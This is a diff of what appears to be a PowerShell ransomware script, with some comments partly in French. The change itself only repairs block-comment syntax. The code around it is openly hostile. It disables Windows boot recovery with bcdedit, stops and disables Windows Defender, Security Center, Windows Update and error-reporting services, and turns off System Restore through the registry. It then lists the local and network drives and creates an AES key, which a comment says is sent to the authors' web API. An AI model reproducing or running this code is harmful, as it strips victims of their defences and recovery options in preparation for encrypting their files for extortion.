@@ -134,12 +134,12 @@ function main{
     }
     catch{} 
     try {
-       < # Disable Windows recovery at startup#>
+       <# Disable Windows recovery at startup#>
         bcdedit /set bootstatuspolicy ignoreallfailures|Out-Null; 
     }
     catch {}
     try{
-      <  # Stop and disable the services Wscsvc - WinDefend - Wuauserv - BITS - ERSvc - WerSvc#>
+      <# Stop and disable the services Wscsvc - WinDefend - Wuauserv - BITS - ERSvc - WerSvc#>
         spsv Wscsvc -ErrorAction SilentlyContinue;
         if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wscsvc'").StartMode) -ne "Disabled"){
         set-service Wscsvc -StartupType Disabled};
@@ -163,10 +163,10 @@ function main{
 
     $hklm=2147483650;$hkcu = 2147483649;
     $reg=[WMIClass]"ROOT\DEFAULT:StdRegProv";
-   < # Disable the security center notifications#>
+   <# Disable the security center notifications#>
     $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}";
     $reg.DeleteKey($hklm, $key)|out-null;
-   < # Disable the system restore#>
+   <# Disable the system restore#>
     $key="SOFTWARE\Microsoft\Windows\CurrentVersion\SystemRestore";
     $reg.CreateKey($hklm, $key)|out-null;
     $reg.SetDWORDValue($hklm, $key, "DisableSR", "1")|out-null;
@@ -179,10 +179,10 @@ function main{
     $reg.DeleteValue($hkcu, $key, "Windows Defender")|out-null;
     $key="SOFTWARE\Policies\Microsoft\Windows Defender";
 
-   < #List al the drives in the computer#>
+   <#List al the drives in the computer#>
     $drives=gwmi Win32_LogicalDisk -Filter "DriveType=3 or DriveType=4"|select Name;
 
-   < #Créée la clé AES#>
+   <#Créée la clé AES#>
     $key = Create-AesKey
     Set-Content 'key.aes' -Value $key 
     <#Envoie la clé AES à notre API Web#>
